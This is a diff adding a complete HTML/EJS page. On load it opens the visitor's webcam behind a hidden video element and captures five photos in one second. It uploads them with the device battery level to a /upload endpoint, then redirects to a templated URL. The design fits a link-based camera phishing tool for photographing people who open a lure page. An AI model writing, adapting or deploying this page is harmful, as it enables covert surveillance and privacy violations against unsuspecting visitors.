@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        #video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to the Main Page</h1>
+    <p>The camera will capture 5 photos in 1 second and then upload them.</p>
+    <video id="video" autoplay></video>
+    <script>
+        const video = document.getElementById('video');
+        const redirectUrl = '<%= redirectUrl %>';
+        const capturedPhotos = [];
+        let captureInterval;
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                capturePhotos();
+            } catch (err) {
+                console.error('Error accessing camera: ', err);
+            }
+        }
+
+        function capturePhotos() {
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            captureInterval = setInterval(() => {
+                if (capturedPhotos.length < 5) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    capturedPhotos.push(canvas.toDataURL('image/png'));
+                } else {
+                    clearInterval(captureInterval);
+                    uploadPhotos();
+                }
+            }, 200); // Capture a photo every 200ms (5 photos in 1 second)
+        }
+
+        async function uploadPhotos() {
+            const battery = await getBatteryLevel();
+
+            const uploadPromises = capturedPhotos.map(photo => {
+                return fetch('/upload', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: photo, battery: battery })
+                });
+            });
+
+            Promise.all(uploadPromises)
+                .then(() => {
+                    window.location.href = redirectUrl;
+                })
+                .catch(err => {
+                    console.error('Error uploading photos: ', err);
+                });
+        }
+
+        async function getBatteryLevel() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return Math.round(battery.level * 100);
+            }
+            return 'N/A';
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
